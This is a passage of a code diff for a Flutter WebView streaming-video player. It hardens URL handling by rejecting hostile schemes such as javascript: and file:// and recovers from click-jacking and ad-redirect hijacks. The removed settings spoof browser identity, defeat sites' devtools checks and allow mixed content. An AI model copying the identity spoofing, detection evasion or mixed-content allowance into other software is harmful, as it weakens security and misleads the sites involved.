   bool _overlayActive = false; // Controls animation (slide/fade)
   bool _dismissedNextEpisodeOverlay = false;
@@ -930,8 +147,9 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   /// 50 ms has held up reliably on iPhones from XS through 15 Pro; bump this
   /// (or switch to `addPostFrameCallback`) if the error reappears on slower
   /// devices.
-  static const Duration _kIosOrientationCommitDelay =
-      Duration(milliseconds: 50);
+  static const Duration _kIosOrientationCommitDelay = Duration(
+    milliseconds: 50,
+  );
 
   /// Latches `true` the first time the main frame finishes loading. Once set,
   /// any subsequent main-frame navigation is checked against the original
@@ -984,6 +202,16 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   /// `LateInitializationError`).
   late final ProviderContainer _providerContainer;
 
+  /// Latched in [dispose] before `super.dispose()` runs. Used by every
+  /// WebView callback that the native side can fire after we've torn down
+  /// — `shouldOverrideUrlLoading`, `shouldInterceptRequest`,
+  /// `onProgressChanged` — to bail out before touching `ref`,
+  /// `_loadProgress`, or any other field whose lifetime is tied to the
+  /// State. `mounted` flips false only after `super.dispose()` returns,
+  /// which is too late for the Windows path where `_cleanupWebView`
+  /// deliberately skips `stopLoading()`.
+  bool _disposed = false;
+
   // ─── Gesture recognizers — transferred to the WebView ────────────────────
   // Giving explicit ownership of these gestures to the WebView prevents the
   // Flutter widget tree from competing, which is the root cause of scroll
@@ -1004,20 +232,40 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
     // make `didChangeDependencies` fire later.
     _providerContainer = ProviderScope.containerOf(context, listen: false);
 
-    // Fail-closed if the route handed us a URL with no resolvable host —
-    // otherwise `_initialHostBase` is empty and the cross-domain navigation
-    // guard at the bottom of `shouldOverrideUrlLoading` silently disables
-    // itself, letting any cross-frame redirect through.
-    final initialHost = Uri.tryParse(widget.url)?.host ?? '';
-    if (initialHost.isEmpty) {
+    // Fail-closed at construction. Three checks:
+    //
+    //   1. The URI must parse.
+    //   2. The scheme MUST be http or https. Without this, a hostile or
+    //      tampered plugin manifest (e.g. one imported via
+    //      ExportImportService from an untrusted `.spovies` backup) could
+    //      hand us `intent://...` / `content://...` / `file://...` /
+    //      `javascript:...` URIs. `InAppWebView.initialUrlRequest` loads
+    //      them directly — `shouldOverrideUrlLoading` is NOT consulted for
+    //      the initial URL on Android — so without this gate the scheme
+    //      block list further down only protects *subsequent* navigations.
+    //   3. The host must be non-empty. Otherwise the cross-domain
+    //      navigation guard at the bottom of `shouldOverrideUrlLoading`
+    //      silently disables itself and any cross-frame redirect slips
+    //      through.
+    //
+    // The install path (`PluginManifestModel.fromJson` →
+    // `UrlValidator.validateUrlTemplate`) already rejects non-http(s)
+    // schemes; this is the defence-in-depth that catches anything that
+    // gets here regardless.
+    final initialUri = Uri.tryParse(widget.url);
+    final initialScheme = initialUri?.scheme.toLowerCase() ?? '';
+    final initialHost = initialUri?.host ?? '';
+    if (initialUri == null ||
+        (initialScheme != 'http' && initialScheme != 'https') ||
+        initialHost.isEmpty) {
       _hasError = true;
-      _errorMsg = 'Invalid stream URL (no host)';
+      _errorMsg = 'Invalid stream URL';
       return;
     }
 
     // Delay the orientation lock until after the first frame on iOS to
     // prevent race conditions with the screen transition.
-    if (Platform.isIOS) {
+    if (PlayerPlatform.isIOS) {
       WidgetsBinding.instance.addPostFrameCallback((_) {
         if (mounted) _lockLandscape();
       });
@@ -1026,10 +274,29 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
     }
 
     _eventBridge = EventBridge(onProgressUpdate: _onProgressUpdate);
-    if (Platform.isWindows) {
+    if (PlayerPlatform.isWindows) {
+      // Subscribe to window-manager events so F11 / native chrome
+      // fullscreen toggles update `_isFullScreen` — previously this
+      // state desynced whenever the user toggled fullscreen outside our
+      // own `_toggleFullScreen` button.
+      windowManager.addListener(this);
       _checkFullScreen();
     }
     _resetControlsTimer();
+  }
+
+  // ── WindowListener (Windows only) ────────────────────────────────────────
+  // Mixin methods default to no-op; we override only the two events we care
+  // about. These fire on F11, double-click title-bar, and the OS shortcuts.
+
+  @override
+  void onWindowEnterFullScreen() {
+    if (mounted && !_isFullScreen) setState(() => _isFullScreen = true);
+  }
+
+  @override
+  void onWindowLeaveFullScreen() {
+    if (mounted && _isFullScreen) setState(() => _isFullScreen = false);
   }
 
   @override
@@ -1077,6 +344,15 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
       });
     }
 
+    // Coalesce Timer churn — the previous implementation cancelled and
+    // re-created a 5 s Timer on every pointer event, which on Windows
+    // fires once per frame (~60 Hz) while the mouse moves. Re-arm at
+    // most once per _kControlsTimerCoalesceMs; the 5 s controls-hide
+    // delay then slips by at most that interval after the user stops.
+    final now = DateTime.now().millisecondsSinceEpoch;
+    if (now - _lastControlsTimerResetMs < _kControlsTimerCoalesceMs) return;
+    _lastControlsTimerResetMs = now;
+
     _controlsTimer?.cancel();
     _controlsTimer = Timer(const Duration(seconds: 5), () {
       if (mounted) setState(() => _showControls = false);
@@ -1094,15 +370,34 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
 
   Future<void> _checkFullScreen() async {
     final isFullscreen = await windowManager.isFullScreen();
-    if (mounted) setState(() => _isFullScreen = isFullscreen);
+    if (!mounted) return;
+    // The WindowListener (registered just above this call in initState)
+    // may have already updated `_isFullScreen` while this await was
+    // suspended — e.g. the user hit F11 externally. Don't clobber the
+    // listener's value: only push state if it would actually change.
+    if (_isFullScreen != isFullscreen) {
+      setState(() => _isFullScreen = isFullscreen);
+    }
   }
 
   @override
   void dispose() {
+    // Latch FIRST so any in-flight WebView callback that fires between
+    // here and `super.dispose()` short-circuits (mounted stays true until
+    // super.dispose() returns).
+    _disposed = true;
     WidgetsBinding.instance.removeObserver(this);
+    if (PlayerPlatform.isWindows) {
+      windowManager.removeListener(this);
+    }
     _controlsTimer?.cancel();
     _overlayTimer?.cancel();
     _cleanupWebView();
+    // Break the retain cycle — the bridge closes over `_onProgressUpdate`
+    // which captures `this`. A nulled reference lets the GC reclaim both
+    // the bridge and any pending callback chain.
+    _eventBridge = null;
+    _loadProgress.dispose();
     // If progress was written during this session but never flushed via a
     // pause/ended event (e.g. the user just closed the player), refresh
     // the Continue Watching row once on the way out.
@@ -1128,12 +423,169 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   void _cleanupWebView() {
     final controller = _controller;
     if (controller != null) {
+      // Drop the JS handler BEFORE nulling the controller reference.
+      // The callback closure registered in `onWebViewCreated` captures
+      // `this` (through `_eventBridge` and `_resetControlsTimer`), so
+      // leaving the handler attached pins the State alive for as long as
+      // the native controller exists. On Windows WebView2 the native
+      // controller can outlive the Flutter platform view, so a leaked
+      // handler leaks one State per playback.
+      try {
+        controller.removeJavaScriptHandler(handlerName: 'spoviesEventBridge');
+      } catch (e) {
+        // `removeJavaScriptHandler` can throw on Windows during
+        // transitional WebView2 states (same root cause as the
+        // E_INVALIDARG we already handle in `_recoverFromHijack`). The
+        // controller is about to be released anyway — log and move on.
+        if (kDebugMode) {
+          debugPrint('Player: removeJavaScriptHandler failed: $e');
+        }
+      }
       // Windows is sensitive to imperative calls during disposal transitions.
       // We nullify the reference and let the native platform view dispose itself.
-      if (!Platform.isWindows) {
+      if (!PlayerPlatform.isWindows) {
         controller.stopLoading();
       }
       _controller = null;
+    }
+  }
+
+  // ─── Hijack recovery ─────────────────────────────────────────────────────
+  //
+  // Used by two different streaming-page attacks that bypass our normal
+  // navigation guards on Windows WebView2:
+  //
+  //   1. `about:blank` click-jacker — overlay anchor on the embed page,
+  //      detected at `onUpdateVisitedHistory`. WebView2 skips
+  //      `shouldOverrideUrlLoading` AND `onLoadStart` for the synthetic
+  //      main-frame navigation that fires after `onCreateWindow` rejects
+  //      a `target="_blank"` anchor with `hasGesture: true`, so
+  //      `onUpdateVisitedHistory` is the earliest signal.
+  //   2. Microsoft Defender SmartScreen takeover — embed page server-side
+  //      redirects to an ad domain SmartScreen has flagged, replacing the
+  //      whole player with a red warning. Detected at `onTitleChanged`.
+  //
+  // Both signals fire only on Windows (WebView2). Both recoveries do the
+  // same thing: stop the load, then `goBack()` (preserves embed-page
+  // state) or `loadUrl(widget.url)` (fallback).
+  //
+  // Two layers of rate-limiting:
+  //
+  //   • Per-type cooldown (`_kRecoveryCooldown`, 2 s) — debounces tight
+  //     re-entry of the SAME signal. SmartScreen fires `onTitleChanged`
+  //     multiple times for the same warning; about:blank fires several
+  //     `onUpdateVisitedHistory` callbacks during the transition. The
+  //     cooldown is keyed by recovery type so an about:blank recovery
+  //     does NOT silence the SmartScreen recovery that fires
+  //     milliseconds later for the same root incident (Provider D → bad
+  //     redirect → both signals fire together).
+  //
+  //   • Circuit breaker — true sliding window over the last
+  //     `_kRecoveryWindowDuration`. We track each recovery's timestamp
+  //     in `_recentRecoveries`; on every call we drop stale entries
+  //     and trip the breaker when the live count crosses
+  //     `_kMaxRecoveriesPerWindow`. This protects against backends like
+  //     `example.com` that 522 + redirect to an
+  //     ad SmartScreen flags in a loop — after 3 attempts in 15 s we
+  //     surface an error and let the user pick a different plugin.
+  //     Counter is GLOBAL across types so a fast-cycling Provider D page
+  //     that trips BOTH signals on each load still escalates to the
+  //     error after 3 round-trips. Failed controller calls (E_INVALIDARG
+  //     during transitional WebView2 states) roll back their entry so
+  //     they don't silently burn the breaker budget without actually
+  //     recovering anything.
+  final Map<String, DateTime> _lastRecoveryByType = {};
+  final List<DateTime> _recentRecoveries = [];
+  static const Duration _kRecoveryCooldown = Duration(seconds: 2);
+  static const int _kMaxRecoveriesPerWindow = 3;
+  static const Duration _kRecoveryWindowDuration = Duration(seconds: 15);
+
+  Future<void> _recoverFromHijack(
+    InAppWebViewController controller,
+    String reason, {
+    required String type,
+  }) async {
+    final now = DateTime.now();
+    final lastForType = _lastRecoveryByType[type];
+    if (lastForType != null &&
+        now.difference(lastForType) < _kRecoveryCooldown) {
+      if (kDebugMode) {
+        debugPrint('Player: $type recovery skipped (cooldown): $reason');
+      }
+      return;
+    }
+
+    // Sliding-window prune: drop entries older than the window. This is
+    // the difference from the previous fixed-window implementation that
+    // would lock the user out at a healthy long-term recovery rate when
+    // recoveries clustered just inside the original window.
+    _recentRecoveries.removeWhere(
+      (t) => now.difference(t) > _kRecoveryWindowDuration,
+    );
+    if (_recentRecoveries.length >= _kMaxRecoveriesPerWindow) {
+      if (kDebugMode) {
+        debugPrint(
+          'Player: recovery circuit breaker tripped '
+          '(${_recentRecoveries.length} attempts in '
+          '${_kRecoveryWindowDuration.inSeconds}s) — showing error',
+        );
+      }
+      if (mounted) {
+        setState(() {
+          _hasError = true;
+          _errorMsg =
+              'This source keeps redirecting or timing out.\n'
+              'Try a different plugin or server.';
+        });
+      }
+      return;
+    }
+
+    _recentRecoveries.add(now);
+    _lastRecoveryByType[type] = now;
+    if (kDebugMode) {
+      debugPrint(
+        'Player: hijack recovery '
+        '(${_recentRecoveries.length}/$_kMaxRecoveriesPerWindow, '
+        'type=$type) — $reason',
+      );
+    }
+
+    // Wrap every native controller call in try/catch — flutter_inappwebview's
+    // Windows C++ side has been observed throwing `E_INVALIDARG` (0x80070057)
+    // at `in_app_webview.cpp:1231` when stopLoading/goBack/loadUrl run during
+    // a transitional WebView2 state. We don't want those to leak as
+    // unhandled async errors.
+    try {
+      await controller.stopLoading();
+      if (!mounted) return;
+      // Prefer goBack() — WebView2's history still has the embed page, so
+      // the previous page state (server selection, video element) is
+      // preserved. Fall back to a fresh load only if there's nothing to
+      // go back to.
+      final canGoBack = await controller.canGoBack();
+      if (!mounted) return;
+      if (canGoBack) {
+        await controller.goBack();
+      } else {
+        await controller.loadUrl(
+          urlRequest: URLRequest(url: WebUri(widget.url)),
+        );
+      }
+    } catch (e, st) {
+      if (kDebugMode) {
+        debugPrint('Player: recovery controller call failed: $e\n$st');
+      }
+      // The native call failed — likely WebView2 was mid-transition.
+      // Roll back the recovery entry we recorded above. Without the
+      // rollback, a sequence of failed controller calls (each from a
+      // recurring transitional state) would silently burn the breaker
+      // budget without performing any real recovery, and the user
+      // would see the "try a different plugin" error even though we
+      // never managed to attempt a recovery.
+      if (_recentRecoveries.isNotEmpty && _recentRecoveries.last == now) {
+        _recentRecoveries.removeLast();
+      }
     }
   }
 
@@ -1141,11 +593,9 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
 
   Future<void> _lockLandscape() async {
     // Orientation lock and immersive mode are mobile-only APIs.
-    if (kIsWeb || Platform.isWindows || Platform.isMacOS || Platform.isLinux) {
-      return;
-    }
+    if (!PlayerPlatform.supportsOrientationLock) return;
 
-    if (Platform.isIOS) {
+    if (PlayerPlatform.isIOS) {
       // First, relax the supported set so iOS 16+ doesn't reject the
       // landscape-only call below with "None of the requested orientations
       // are supported".
@@ -1155,6 +605,10 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
         DeviceOrientation.portraitUp,
       ]);
       await Future.delayed(_kIosOrientationCommitDelay);
+      // After the await: if the user popped the route in this 50 ms
+      // window, the second `setPreferredOrientations` below would land on
+      // the parent screen, leaving it stuck in landscape + immersive.
+      if (_disposed) return;
     }
 
     await SystemChrome.setPreferredOrientations([
@@ -1166,9 +620,7 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
   }
 
   Future<void> _restorePortrait() async {
-    if (kIsWeb || Platform.isWindows || Platform.isMacOS || Platform.isLinux) {
-      return;
-    }
+    if (!PlayerPlatform.supportsOrientationLock) return;
     await SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
     await SystemChrome.setEnabledSystemUIMode(
       SystemUiMode.manual,
@@ -1267,183 +719,21 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
     }
   }
 
-  // ─── Settings ────────────────────────────────────────────────────────────
+  // ─── WebView config — see web_view_player_config.dart ───────────────────
 
-  InAppWebViewSettings get _settings => InAppWebViewSettings(
-    // User-Agent & Content Mode.
-    //
-    // Windows & Android → Desktop Chrome UA + DESKTOP content mode.
-    // Streaming embed sites (e.g. example.com, example.*) serve their desktop
-    // player layout when they see a desktop UA.  The mobile layout is often
-    // missing player DOM elements that the site's own JS expects, causing
-    // `null.addEventListener` crashes and a blank/broken player on Android.
-    //
-    // iOS → Mobile Safari UA + MOBILE content mode.
-    // iOS playback works correctly in mobile mode thanks to `allowsInlineMediaPlayback`
-    // and the `_kIosInlineVideoFix` script.  Switching iOS to desktop mode can
-    // break `playsinline` behaviour on WKWebView.
-    userAgent: Platform.isIOS
-        ? 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
-        : Platform.isAndroid
-        ? 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
-        : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
+  InAppWebViewSettings get _settings => WebViewPlayerConfig.buildSettings();
 
-    preferredContentMode: Platform.isIOS || Platform.isAndroid
-        ? UserPreferredContentMode.MOBILE
-        : UserPreferredContentMode.DESKTOP,
-
-    // Playback — inline is required so iOS does not hand off to AVPlayer.
-    mediaPlaybackRequiresUserGesture: false,
-    allowsInlineMediaPlayback: true,
-    // Disable PiP: entering Picture-in-Picture tears the video out of the
-    // WebView context and hands it to AVPlayer, killing the web controls.
-    allowsPictureInPictureMediaPlayback: false,
-
-    // JavaScript & Storage
-    javaScriptEnabled: true,
-    domStorageEnabled: true,
-    cacheEnabled: true,
-
-    // ── Performance ──────────────────────────────────────────────────
-    // GPU rendering on Android — biggest impact on scroll/video lag.
-    // NOTE: Disabled on Android by default to prevent black screen rendering
-    // issues on specific GPUs (Xiaomi/Redmi) when using Impeller.
-    hardwareAcceleration: !Platform.isAndroid,
-    // Skip expensive initial layout/zoom computations.
-    useWideViewPort: false,
-    loadWithOverviewMode: false,
-    // Remove Android overscroll glow that triggers recompositing.
-    overScrollMode: OverScrollMode.NEVER,
-    // We show our own error state — skip the default error page.
-    disableDefaultErrorPage: true,
-
-    // Scroll & touch
-    // NOTE: do NOT set isScrollEnabled: false — lists inside the player
-    // depend on the WebView's native scroll.
-    supportZoom: false,
-    disableContextMenu: true,
-
-    // iOS: disable swipe-back/forward navigation so it doesn't intercept
-    // horizontal swipes inside the player UI (e.g. carousels, tab bars).
-    allowsBackForwardNavigationGestures: false,
-
-    // Rendering
-    transparentBackground: true,
-
-    // Allow mixed content for maximal provider compatibility.
-    mixedContentMode: MixedContentMode.MIXED_CONTENT_ALWAYS_ALLOW,
-
-    // Reduce unnecessary resource tracking
-    useOnLoadResource: false,
-
-    // Enable network-level ad blocking via shouldInterceptRequest.
-    // Extremely slow on Windows due to platform channel overhead for every HLS video chunk.
-    useShouldInterceptRequest: !Platform.isWindows,
-
-    // Enable multi-window support so onCreateWindow is called — we block
-    // every popup attempt there.  Without this, some ad popups bypass the
-    // WebView entirely and trigger external browser intents.
-    supportMultipleWindows: true,
-
-    // Block JavaScript from opening alert/confirm/prompt dialogs that ad
-    // scripts abuse to prevent the user from closing the page.
-    javaScriptCanOpenWindowsAutomatically: false,
-
-    // NOTE: ContentBlocker rules were removed — on Android,
-    // flutter_inappwebview's ContentBlockerHandler makes HTTP
-    // connections to blocked domains to determine resource type,
-    // causing ConnectException floods.  Ad blocking is handled by:
-    //   1. shouldOverrideUrlLoading (blocks navigation)
-    //   2. shouldInterceptRequest (blocks ad resource loads)
-    //   3. _kAdRemovalJs (removes DOM elements)
-    //   4. _kAntiClickjackJs (prevents click-jacking)
-    //   5. onCreateWindow → false (blocks popups)
+  List<UserScript> get _userScripts => WebViewPlayerConfig.buildUserScripts(
+    scripts: PlayerScripts.instance,
+    resumeTimeSeconds: widget.resumeTimeSeconds,
   );
-
-  List<UserScript> get _userScripts => [
-    // 0. Inject instant block heuristic for JS level blocking.
-    UserScript(
-      source: _kSpoviesIsAdJs,
-      injectionTime: UserScriptInjectionTime.AT_DOCUMENT_START,
-      forMainFrameOnly: false,
-    ),
-    // 1. Android: Spoof navigator.userAgentData ASAP so any inline scripts that
-    //    run at document-start see a regular Chrome identity, not "Android WebView".
-    //    Applied before all other scripts so site feature-detection runs against
-    //    the spoofed data.
-    if (Platform.isAndroid)
-      UserScript(
-        source: _kSpoofUserAgentDataJs,
-        injectionTime: UserScriptInjectionTime.AT_DOCUMENT_START,
-        forMainFrameOnly: false,
-      ),
-    // 2. Spovies AdGuard (DNS-level block replacement).
-    UserScript(
-      source: _kAdGuardJs,
-      injectionTime: UserScriptInjectionTime.AT_DOCUMENT_START,
-      forMainFrameOnly: false,
-    ),
-    // 3. Suppress console and spoof devtool checks ASAP.
-    if (!Platform.isAndroid)
-      UserScript(
-        source: _kConsoleKillerJs,
-        injectionTime: UserScriptInjectionTime.AT_DOCUMENT_START,
-        forMainFrameOnly: false,
-      ),
-    // 4. Block ad scripts and popups (Cross-platform).
-    UserScript(
-      source: _kAdRemovalJs,
-      injectionTime: UserScriptInjectionTime.AT_DOCUMENT_START,
-      forMainFrameOnly: false,
-    ),
-    // 3. Block click-jacking.
-    UserScript(
-      source: _kAntiClickjackJs,
-      injectionTime: UserScriptInjectionTime.AT_DOCUMENT_START,
-      forMainFrameOnly: false,
-    ),
-    // 4. Styling and general fixes.
-    // forMainFrameOnly: false — streaming sites embed their <video> in
-    // cross-origin iframes; fullscreen suppression and inline-video fixes
-    // must run inside those frames to be effective.
-    UserScript(
-      source: _kSuppressFullscreenJs,
-      injectionTime: UserScriptInjectionTime.AT_DOCUMENT_START,
-      forMainFrameOnly: false,
-    ),
-    UserScript(
-      source: _kIosInlineVideoFix,
-      injectionTime: UserScriptInjectionTime.AT_DOCUMENT_START,
-      forMainFrameOnly: false,
-    ),
-    UserScript(
-      source: _kNoSelectCss,
-      injectionTime: UserScriptInjectionTime.AT_DOCUMENT_START,
-    ),
-    // 5. App-specific bridge, activity tracking, and progress tracking
-    UserScript(
-      source: _kBridgeJs,
-      injectionTime: UserScriptInjectionTime.AT_DOCUMENT_END,
-      forMainFrameOnly: false,
-    ),
-    UserScript(
-      source: _kUserActivityJs,
-      injectionTime: UserScriptInjectionTime.AT_DOCUMENT_START,
-      forMainFrameOnly: false,
-    ),
-    UserScript(
-      source: _videoProgressJs(widget.resumeTimeSeconds),
-      injectionTime: UserScriptInjectionTime.AT_DOCUMENT_END,
-      forMainFrameOnly: false,
-    ),
-  ];
 
   // ─── Build ───────────────────────────────────────────────────────────────
 
   @override
   Widget build(BuildContext context) {
     Widget content;
-    if (Platform.isWindows) {
+    if (PlayerPlatform.isWindows) {
       final envAsync = ref.watch(webViewEnvironmentProvider);
       content = envAsync.when(
         data: (env) {
@@ -1469,25 +759,34 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
     return PopScope(
       canPop: false,
       onPopInvokedWithResult: (didPop, _) {
-        if (!didPop) _dismiss();
+        if (didPop) return;
+        // System back from inside the player jumps straight to /home
+        // (skipping any intermediate /details/etc. route) so it lines up
+        // with the shell-level "any page → home → exit prompt" contract.
+        // The X button keeps the old one-level-pop behaviour via
+        // [_dismiss] for users who want to return to the details screen.
+        _backToHome();
       },
       child: Scaffold(
         backgroundColor: Colors.black,
-        body: MouseRegion(
-          onHover: (_) => _resetControlsTimer(),
-          child: Listener(
-            onPointerDown: (_) => _resetControlsTimer(),
-            onPointerMove: (_) => _resetControlsTimer(),
-            behavior: HitTestBehavior.translucent,
-            child: Stack(
-              children: [
-                content,
-                _buildLoadingOverlay(),
-                _buildProgressBar(),
-                _buildWindowActions(),
-                _buildNextEpisodeOverlay(),
-              ],
-            ),
+        // A single Listener covers every pointer kind:
+        //   • onPointerDown / onPointerMove → touch + held mouse
+        //   • onPointerHover → bare mouse hover on desktop
+        // The previous MouseRegion + Listener pair duplicated every mouse
+        // event, calling _resetControlsTimer twice per frame on Windows.
+        body: Listener(
+          behavior: HitTestBehavior.translucent,
+          onPointerDown: (_) => _resetControlsTimer(),
+          onPointerMove: (_) => _resetControlsTimer(),
+          onPointerHover: (_) => _resetControlsTimer(),
+          child: Stack(
+            children: [
+              content,
+              _buildLoadingOverlay(),
+              _buildProgressBar(),
+              _buildWindowActions(),
+              _buildNextEpisodeOverlay(),
+            ],
           ),
         ),
       ),
@@ -1528,7 +827,7 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
             // the WebView from triggering framework assertions during layout.
             // On other platforms (Android/iOS), we return .ignored so system
             // and hardware keys work naturally.
-            return Platform.isWindows
+            return PlayerPlatform.isWindows
                 ? KeyEventResult.handled
                 : KeyEventResult.ignored;
           },
@@ -1539,11 +838,10 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
             key: ValueKey('spovies_player_${widget.url}'),
             webViewEnvironment: environment,
             preventGestureDelay: true,
-            gestureRecognizers:
-                (!kIsWeb &&
-                    (Platform.isWindows ||
-                        Platform.isMacOS ||
-                        Platform.isLinux))
+            // Desktop platforms don't want any gesture competition with the
+            // WebView. Mobile transfers vertical/horizontal drag + scale to
+            // the WebView so embedded list scroll stays smooth.
+            gestureRecognizers: PlayerPlatform.isDesktop
                 ? const <Factory<OneSequenceGestureRecognizer>>{}
                 : <Factory<OneSequenceGestureRecognizer>>{
                     Factory<VerticalDragGestureRecognizer>(
@@ -1562,30 +860,111 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
               controller.addJavaScriptHandler(
                 handlerName: 'spoviesEventBridge',
                 callback: (args) {
-                  if (args.isNotEmpty) {
-                    final rawMessage = args[0].toString();
-                    if (rawMessage.contains('"type":"USER_ACTIVITY"')) {
-                      _resetControlsTimer();
-                      return;
-                    }
-                    if (mounted) _eventBridge?.handleMessage(rawMessage);
+                  if (args.isEmpty || _disposed) return;
+                  final rawMessage = args[0].toString();
+
+                  // Parse the JSON ONCE at the boundary instead of doing a
+                  // raw `rawMessage.contains('"type":"USER_ACTIVITY"')`
+                  // substring check. The substring match collides with any
+                  // payload that mentions the literal string in a nested
+                  // field (e.g. `data.notes = "see \"type\":\"USER_ACTIVITY\""`),
+                  // causing legitimate PLAYER_EVENTs to be silently dropped.
+                  Map<String, dynamic>? parsed;
+                  try {
+                    final decoded = jsonDecode(rawMessage);
+                    if (decoded is Map<String, dynamic>) parsed = decoded;
+                  } catch (_) {
+                    // Non-JSON payload — let EventBridge.handleMessage
+                    // decide (it has its own try/catch for that case).
                   }
+                  if (parsed?['type'] == 'USER_ACTIVITY') {
+                    _resetControlsTimer();
+                    return;
+                  }
+                  if (mounted) _eventBridge?.handleMessage(rawMessage);
                 },
               );
             },
             onProgressChanged: (controller, progress) {
-              if (!mounted) return;
+              // _disposed before mounted — the WebView's native side can
+              // fire callbacks between `_loadProgress.dispose()` and
+              // `super.dispose()`, when `mounted` is still true but the
+              // notifier has already been torn down.
+              if (_disposed || !mounted) return;
               // Latch once: powers the post-load cross-domain check in
-              // shouldOverrideUrlLoading. Set before setState so the next
-              // build sees a consistent state.
+              // shouldOverrideUrlLoading.
               if (progress >= 100) _initialLoadComplete = true;
-              setState(() {
-                _loadProgress = progress.toDouble();
-              });
+              // ValueNotifier — only the progress bar + loading overlay
+              // rebuild, not the whole Scaffold/Stack tree.
+              _loadProgress.value = progress.toDouble();
+            },
+            onUpdateVisitedHistory: (controller, url, isReload) async {
+              // ── Click-jacker about:blank recovery (Windows only) ─────
+              //
+              // Windows WebView2 skips BOTH `shouldOverrideUrlLoading`
+              // AND `onLoadStart` for the synthetic main-frame
+              // navigation that fires after we return `false` from
+              // `onCreateWindow` on a `target="_blank"` anchor click
+              // with `hasGesture: true`. `onUpdateVisitedHistory` is
+              // the earliest callback that fires with the URL.
+              //
+              // The same callback fires for *legitimate* in-page
+              // navigation (server-switch), so we filter strictly on
+              // `about:blank` / `about:` and leave everything else.
+              //
+              // The `_initialLoadComplete` gate the previous version
+              // had is intentionally dropped: streaming sites that SPA-
+              // redirect before progress hits 100 % never latched the
+              // flag, leaving them with no recovery path on about:blank
+              // hijacks. about:blank is never a legitimate main-frame
+              // state for a streaming page — treating it as a hijack
+              // unconditionally is safe.
+              if (!PlayerPlatform.isWindows) return;
+              if (_disposed || !mounted) return;
+              final urlStr = url?.toString() ?? '';
+              if (urlStr == 'about:blank' || urlStr.startsWith('about:')) {
+                await _recoverFromHijack(
+                  controller,
+                  'about:blank navigation',
+                  type: 'about_blank',
+                );
+              }
+            },
+            onTitleChanged: (controller, title) async {
+              // ── Microsoft Defender SmartScreen recovery (Windows only) ──
+              //
+              // Some streaming embeds server-side redirect to ad
+              // domains (e.g. brightadnetwork.com). When SmartScreen's
+              // database has the destination flagged, WebView2 replaces
+              // the entire page with its red full-screen
+              // "Reported Unsafe Site: Navigation Blocked" warning. The
+              // page URL stays unchanged but the title flips to a known
+              // SmartScreen string. SmartScreen is a Windows Defender
+              // feature; on every other platform a title coincidentally
+              // containing one of these markers would just be a normal
+              // page (e.g. a documentation site discussing the warning
+              // dialog), so this whole handler is Windows-only.
+              if (!PlayerPlatform.isWindows) return;
+              if (_disposed || !mounted) return;
+              final t = title ?? '';
+              const smartScreenMarkers = [
+                'SmartScreen',
+                'Reported Unsafe',
+                'Navigation Blocked',
+                'reported as unsafe',
+              ];
+              final hit = smartScreenMarkers.any(t.contains);
+              if (hit) {
+                await _recoverFromHijack(
+                  controller,
+                  'SmartScreen: "$t"',
+                  type: 'smartscreen',
+                );
+              }
             },
             onReceivedError: (controller, request, error) {
               final isMainFrame = request.isForMainFrame ?? false;
-              if (isMainFrame && _loadProgress < 50 && mounted) {
+              if (isMainFrame && _loadProgress.value < 50 && mounted) {
                 setState(() {
                   _hasError = true;
                   _errorMsg = error.description;
@@ -1613,7 +992,7 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
                   return;
                 }
                 // On Windows, some sites flood with Bot/Proxy detection logs (Adscore).
-                if (Platform.isWindows && msg.contains('Adscore')) return;
+                if (PlayerPlatform.isWindows && msg.contains('Adscore')) return;
 
                 debugPrint('WebView: $msg');
               }
@@ -1650,14 +1029,46 @@ class _WebViewPlayerScreenState extends ConsumerState<WebViewPlayerScreen>
               );
             },
             onCreateWindow: (controller, createWindowAction) async {
+              // We don't open popup windows. Returning false suppresses
+              // the new-window request itself; on Windows WebView2, a
+              // `target="_blank"` anchor click with `hasGesture: true`
+              // then falls back to navigating the CURRENT frame to the
+              // anchor's href. When that href is `about:blank`, the
+              // player gets wiped — caught and recovered in
+              // `onUpdateVisitedHistory` below.
+              //
+              // We tried pre-empting here with a microtask that called
+              // `_recoverFromHijack` before WebView2 could dispatch the
+              // fallback. It backfired: the pre-empt fires *before*
+              // WebView2 has started the about:blank load, so
+              // `stopLoading` is a no-op, the recovery completes
+              // trivially, the cooldown latches, and the *real* recovery
+              // attempt from `onUpdateVisitedHistory` then gets blocked
+              // by the cooldown — leaving the user stuck on about:blank.
               return false;
             },
             shouldOverrideUrlLoading: (controller, navigationAction) async {
+              // The native side can fire this AFTER `dispose()` runs on
+              // Windows; gating on `_disposed` first prevents the
+              // `_providerContainer.read` below from racing the container's
+              // own teardown.
+              if (_disposed) return NavigationActionPolicy.CANCEL;
+
               final urlRequest = navigationAction.request;
               final url = urlRequest.url?.toString() ?? '';
               if (url.isEmpty) return NavigationActionPolicy.ALLOW;
 
               final scheme = urlRequest.url?.scheme ?? '';
+              // Main-frame `javascript:` navigation executes the script in
+              // the current document's origin. Sub-frames legitimately use
